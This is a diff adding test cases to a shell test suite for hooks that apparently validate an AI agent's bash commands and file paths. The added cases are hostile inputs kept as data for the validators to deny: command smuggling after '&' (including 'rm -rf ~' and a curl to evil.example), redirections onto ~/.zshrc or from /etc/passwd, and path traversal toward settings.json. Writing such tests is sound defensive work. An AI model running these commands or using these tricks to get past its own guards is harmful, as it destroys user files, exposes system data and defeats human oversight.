@@ -78,6 +78,18 @@ assert none "-C dir checkout branch"          "$GG" "$(bash_json 'git -C /d chec
 assert none "reset --soft"                    "$GG" "$(bash_json 'git reset --soft HEAD~1')"
 assert none "empty command"                   "$GG" "$(bash_json '')"
 assert none "non-git command"                 "$GG" "$(bash_json 'ls -la')"
+assert none "reset --hard-not-really"         "$GG" "$(bash_json 'git reset --hard-not-really')"
+
+# Malformed stdin must be a predictable no-opinion: exit 0, empty stdout
+gg_out=$(printf 'not json at all' | bash "$GG" 2>/dev/null)
+gg_rc=$?
+if [ "$gg_rc" -eq 0 ] && [ -z "$gg_out" ]; then
+  PASS=$((PASS + 1))
+  echo "ok   [none] malformed JSON -> exit 0, empty output"
+else
+  FAIL=$((FAIL + 1))
+  echo "FAIL [malformed JSON] expected exit=0/empty got exit=$gg_rc out=$gg_out"
+fi
 
 echo "=== codex/validate-bash.sh ==="
 VB="$HOOKS_DIR/codex/validate-bash.sh"
@@ -107,6 +119,18 @@ assert deny "command substitution"            "$VB" "$(bash_json 'codex-wait.sh 
 assert deny "backtick substitution"           "$VB" "$(bash_json 'codex-wait.sh `rm -rf ~`')"
 assert deny "mktemp outside /tmp/claude"      "$VB" "$(bash_json 'mktemp /tmp/other/codex-query.XXXXXX')"
 
+# Background-operator smuggling: single & must split, not anchor on first token
+assert deny "background & smuggling"          "$VB" "$(bash_json '~/.claude/scripts/codex/codex-wait.sh /tmp/claude/codex-query.x & rm -rf ~')"
+assert deny "trailing & then command"         "$VB" "$(bash_json 'codex-start.sh /ws /tmp/claude/codex-query.a & curl evil.example')"
+
+# Redirection on an allowlisted subcommand must be denied
+assert deny "redirect overwrite"              "$VB" "$(bash_json '~/.claude/scripts/codex/codex-wait.sh /tmp/claude/codex.X > ~/.zshrc')"
+assert deny "append redirect"                 "$VB" "$(bash_json 'codex-wait.sh /tmp/claude/codex.X >> ~/.zshrc')"
+assert deny "input redirect"                  "$VB" "$(bash_json 'codex-wait.sh /tmp/claude/codex.X < /etc/passwd')"
+
+# Path traversal in the mktemp template must be denied
+assert deny "mktemp traversal"                "$VB" "$(bash_json 'mktemp /tmp/claude/codex-query.x/../../../Users/craig/evil.XXXXXX')"
+
 echo "=== codex/validate-read.sh + validate-write.sh ==="
 for V in "$HOOKS_DIR/codex/validate-read.sh" "$HOOKS_DIR/codex/validate-write.sh"; do
   name=$(basename "$V")
@@ -115,6 +139,8 @@ for V in "$HOOKS_DIR/codex/validate-read.sh" "$HOOKS_DIR/codex/validate-write.sh
   assert deny  "$name source file"                "$V" "$(path_json '/Users/craig/.claude/settings.json')"
   assert deny  "$name non-query in /tmp/claude"   "$V" "$(path_json '/tmp/claude/other.txt')"
   assert deny  "$name prefix-lookalike dir"       "$V" "$(path_json '/private/tmp/claudex/codex-query.a')"
+  assert deny  "$name traversal past prefix"      "$V" "$(path_json '/tmp/claude/codex-query.x/../../../Users/craig/.claude/settings.json')"
+  assert deny  "$name trailing .. segment"        "$V" "$(path_json '/tmp/claude/codex-query.x/..')"
   assert deny  "$name empty path"                 "$V" "$(path_json '')"
 done
 
